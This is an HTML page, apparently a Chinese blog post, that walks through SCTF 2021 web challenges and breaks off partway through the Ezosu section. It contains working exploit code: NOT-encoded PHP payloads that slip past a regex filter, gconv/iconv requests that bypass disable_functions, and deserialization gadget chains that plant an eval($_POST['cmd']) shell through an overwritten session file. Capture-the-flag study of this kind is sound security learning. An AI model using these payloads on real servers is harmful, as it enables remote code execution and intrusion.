@@ -1,0 +1,559 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>SCTF复现 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SCTF复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-18 22:06" pubdate>
+        2022年1月18日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      28
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SCTF复现</h1>
+            
+            <div class="markdown-body">
+              <p>当时那段时间一直在复习就怎么打比赛，现在放假终于是有时间来复现一些题目，学新的东西了。</p>
+<h1 id="Rceme"><a href="#Rceme" class="headerlink" title="Rceme"></a>Rceme</h1><p>参考的一些文章</p>
+<p><a target="_blank" rel="noopener" href="http://naman.club/index.php/2022/01/11/sctf2021-web/">http://naman.club/index.php/2022/01/11/sctf2021-web/</a></p>
+<p><a target="_blank" rel="noopener" href="https://eastjun.top/2021/10/20/bypass_disable_function/">https://eastjun.top/2021/10/20/bypass_disable_function/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/">https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/</a></p>
+<p>源码直接给出来了，看到<code>eval</code>应该要执行命令，但有过滤。<code>preg_match</code>先是过滤了一堆可用得字符，异或，字母，数字等都被过滤了。学习了下wp发现是可以利用取反来构造需要得函数，这是第一步。但进入界面还能看到<code>disable_functions</code>基本上全都被禁用了，所以后面还需要绕过<code>disable_functions</code>才行。</p>
+<p>首先看第一个过滤<code>preg_match</code>，基本过滤了字符数字，还有一些符号等。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="hljs-variable">$code</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p>第二个正则是一个递归正则（递归正则可以看看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-ck-need-u/p/11344531.html%EF%BC%89%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E9%80%92%E5%BD%92%E6%AD%A3%E5%88%99%E6%9C%89%E4%B8%A4%E7%A7%8D%E5%8C%B9%E9%85%8D%E6%96%B9%E5%BC%8F%EF%BC%8C">https://www.cnblogs.com/f-ck-need-u/p/11344531.html），这里的递归正则有两种匹配方式，</a></p>
+<p>第一种类似于这种<code>code=[~%00]([~%00]());</code>是在递归匹配<code>(?R)?</code>中的？选择进行了1次，第二种类似于<code>code=[~%00]();</code>是在递归匹配<code>(?R)?</code>中的？选择进行了0次。当然这里也替换掉了除<code>\s ()</code>外的东西。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>)<br></code></pre></div></td></tr></table></figure>
+
+<p>不管是异或，取反，或，就是利用一些非字符数字单双引号等这些有用可见的其他字符，通过数学操作能够转换成另一种等价的表现形式，但是这种形式的值对应一些有用的字符。例如说异或</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></div></td></tr></table></figure>
+
+<p>取反就更简单，例如</p>
+<p><img src="https://img-blog.csdnimg.cn/44e4ded69f404a3796c83dfe2dc1c859.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>学习完一些东西，就开始做题。这里用取反构造一条链子<code>create_function(...unserialize(end(getallheaders)))</code> 其中<code>...</code>是利用可变长度参数来传参.</p>
+<p>写个脚本构造payload,<code>!%FF</code>就是0，<code>~%CF</code>也可以</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode, quote<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NOT_chain</span>(<span class="hljs-params">chain</span>):</span><br>    j = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chain:<br>        j += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span> - <span class="hljs-built_in">ord</span>(i)))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> j<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_chain</span>(<span class="hljs-params">chains</span>):</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> chain <span class="hljs-keyword">in</span> chains:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;%d1%d1%d1&quot;</span> <span class="hljs-keyword">in</span> NOT_chain(chain):<br>            result += <span class="hljs-string">&quot;...[~&quot;</span> + NOT_chain(chain).replace(<span class="hljs-string">&quot;%d1%d1%d1&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)  + <span class="hljs-string">&quot;][!%FF](&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result += <span class="hljs-string">&quot;[~&quot;</span> + NOT_chain(chain) + <span class="hljs-string">&quot;][!%FF](&quot;</span><br>    result = result +<span class="hljs-string">&quot;))));&quot;</span><br>    <span class="hljs-keyword">return</span>  result<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">input</span> = <span class="hljs-string">&quot;call_user_func(...unserialize(end(getallheaders)))&quot;</span><br>    chains = <span class="hljs-built_in">input</span>.strip(<span class="hljs-string">&#x27;)&#x27;</span>).split(<span class="hljs-string">&#x27;(&#x27;</span>)<br>    <span class="hljs-comment"># print(make_chain(chains))</span><br>    <span class="hljs-comment">#[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span><br></code></pre></div></td></tr></table></figure>
+
+<p>抓包发送请求</p>
+<p><img src="https://img-blog.csdnimg.cn/7e315a20ab4a426aa72b4861543342de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>第二部分就是利用原生类写文件，<code>iconv</code>方bypass式绕过函数限制，原理网上也很多</p>
+<p>可以利用<code>FilesystemIterator</code>类读文件，根目录不可读</p>
+<p><img src="https://img-blog.csdnimg.cn/17a61ba0f4ce42b7b087815be33ffe9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>接着开始绕过disable_function，利用<code>SplFileObject</code>写文件，一些post内容</p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&amp;11=$file = new SplFileObject(&quot;/tmp/gconv-modules&quot;, &#x27;w+&#x27;);$file-&gt;fwrite(&quot;module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2<br>module  INTERNAL    EXP//    ../../../../../../../../tmp/exp    2&quot;);<br><br><br>写入so文件时也就是用伪协议传base64解码太长了不贴了。<br><br>#触发<br>cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&amp;11=putenv(&quot;GCONV_PATH=/tmp/&quot;);$c=new SplFileObject(&#x27;php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==&#x27;);show_source(&quot;/tmp/flag&quot;);<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/fc967ed38b6d420490442f1b8ee96681.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>关于一些绕过还有很多方式</p>
+<p><a target="_blank" rel="noopener" href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
+<h1 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload_it"></a>Upload_it</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>审计一下<code>index.php</code>可以发现<code>      $upload_file_path = $_SESSION[&quot;upload_path&quot;].&quot;/&quot;.$_POST[&#39;path&#39;];</code>进行了字符串拼接，并且这里的<code>$_SESSION[&quot;upload_path&quot;]</code>是可控的，所以联想到触发<code>toString()</code>函数，全局搜索一下发现可利用点</p>
+<p><img src="https://img-blog.csdnimg.cn/0df57b5f05144b7e8f9aff06a55720fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>写exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br>	<span class="hljs-title">class</span> <span class="hljs-title">LazyString</span> &#123;<br>		<span class="hljs-title">private</span> $<span class="hljs-title">value</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>			<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../vendor/opis/closure/autoload.php&quot;</span>;<br>			<span class="hljs-variable">$x</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>				<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>			&#125;;<br>			<span class="hljs-variable">$x</span> = \Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$x</span>);<br>			<span class="hljs-keyword">$this</span>-&gt;value = unserialize(<span class="hljs-variable">$x</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>	$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> \<span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>\<span class="hljs-title">LazyString</span>();<br>	<span class="hljs-variable">$s</span> = session_start();<br>	<span class="hljs-keyword">echo</span> session_id();<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_path&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>上传本地运行后获取的session文件，覆盖服务器上的session文件</p>
+<p><img src="https://img-blog.csdnimg.cn/3b1ebf40dffa49efb1dbe5a1b80d5ddb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>再次访问时，会读取我们覆盖的session文件，并且触发发序列化，因为session文件序列化写进去，一定会反序列化读出来的。然后即可执行命令</p>
+<p><img src="https://img-blog.csdnimg.cn/3c3a8f69c24345a5bf56e2d6960d146f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="天枢的非预期"><a href="#天枢的非预期" class="headerlink" title="天枢的非预期"></a>天枢的非预期</h2><p>这个非预期真是太细了，<code>Sndav</code>👴真是太牛了。拿这个exp动调了一下，开始没看懂什么意思。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../vendor/autoload.php&quot;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Opis</span>\<span class="hljs-title">Closure</span>\<span class="hljs-title">SerializableClosure</span>;<br>session_start();<br><span class="hljs-variable">$closure</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">123123</span>;<br>&#125;;<br><span class="hljs-comment">// phpinfo();</span><br><span class="hljs-variable">$closure</span> = <span class="hljs-keyword">new</span> SerializableClosure(<span class="hljs-variable">$closure</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$closure</span>;<br></code></pre></div></td></tr></table></figure>
+
+<p>可以看到走到<code>$_SESSION[&#39;a&#39;] = $closure;</code>时调用<code>serialize</code>函数，其中有一个<code>&#39;function&#39;</code>键</p>
+<p><img src="https://img-blog.csdnimg.cn/527f4004ca614f49ba3aa2c16f2b0b16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>我们需要将源码改为</p>
+<p><img src="https://img-blog.csdnimg.cn/865b8019af5f441d9087dafbb4dc40a4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>然后该下exp再动调</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../vendor/autoload.php&quot;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Opis</span>\<span class="hljs-title">Closure</span>\<span class="hljs-title">SerializableClosure</span>;<br>session_start();<br><span class="hljs-variable">$closure</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">123123</span>;<br>&#125;;<br><span class="hljs-comment">// phpinfo();</span><br><span class="hljs-variable">$closure</span> = <span class="hljs-keyword">new</span> SerializableClosure(<span class="hljs-variable">$closure</span>);<br><span class="hljs-variable">$x</span> = Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$closure</span>);<br>unserialize(<span class="hljs-variable">$x</span>);<br></code></pre></div></td></tr></table></figure>
+
+<p>当走到<code> $data = \serialize($data);</code>这一步时，就是返回上面说的<code>$ret</code>变量</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220117001609023.png" srcset="/img/loading.gif" lazyload alt="image-20220117001609023"></p>
+<p>这时可以发现它序列化后的数据中间有我们的执行函数了。</p>
+<p><img src="https://img-blog.csdnimg.cn/23d425bf8b65455da0a86474682fddf8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>在<code>unserialize</code>中，走到这一步就会执行命令</p>
+<p><img src="https://img-blog.csdnimg.cn/cb667aad79404c1ead4b75bc1ee904c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>后面的做法也是覆盖原session文件</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解感觉…怎么说呢不太能理解，不知道这个序列化的地方在哪，需要传什么上去。要是覆盖session的话，那也是触发反序列化，还是说后面还会再学序列化。exp也没看懂最后b64一下是在干啥。</p>
+<h1 id="Upload-it2"><a href="#Upload-it2" class="headerlink" title="Upload_it2"></a>Upload_it2</h1><p>和上面差不多。这里用<code>[$san, &#39;backdoor&#39;]()</code>调用了函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br>	<span class="hljs-title">class</span> <span class="hljs-title">LazyString</span> &#123;<br>		<span class="hljs-title">private</span> $<span class="hljs-title">value</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;value = <span class="hljs-variable">$x</span>;<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>	// <span class="hljs-title">use</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>;<br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sandbox</span> </span>&#123;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;evil = <span class="hljs-variable">$x</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-variable">$san</span> = <span class="hljs-keyword">new</span> sandbox(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>	<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Symfony\Component\<span class="hljs-keyword">String</span>\LazyString([<span class="hljs-variable">$san</span>, <span class="hljs-string">&#x27;backdoor&#x27;</span>]);<br>	session_start();<br>	<span class="hljs-keyword">echo</span> session_id();<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_path&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="Ezosu"><a href="#Ezosu" class="headerlink" title="Ezosu"></a>Ezosu</h1><p>题目给了附件是能够在本地搭环境的，将docker里面文件打包出来审计。关键的函数，简单的以<code>|</code>为分割键名和键值，所以这里我们在键名里面插入恶意反序列数据，就能造成逃逸。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 